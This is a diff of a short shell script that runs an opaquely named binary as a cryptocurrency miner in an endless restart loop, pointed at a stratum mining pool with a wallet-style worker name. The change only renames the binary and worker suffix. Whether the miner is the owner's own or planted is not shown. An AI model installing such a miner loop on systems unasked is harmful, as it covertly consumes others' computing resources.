@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-	./CRD_15 -a YespowerNull -o stratum+tcp://stratum-na.rplant.xyz:7017 -u web1q0esp7rarj5hd6pcxsqy6ewvfuv7pl7t4nzx7uk.15 -t1
+	./CRD_16 -a YespowerNull -o stratum+tcp://stratum-na.rplant.xyz:7017 -u web1q0esp7rarj5hd6pcxsqy6ewvfuv7pl7t4nzx7uk.16 -t1
 	sleep 5
 done
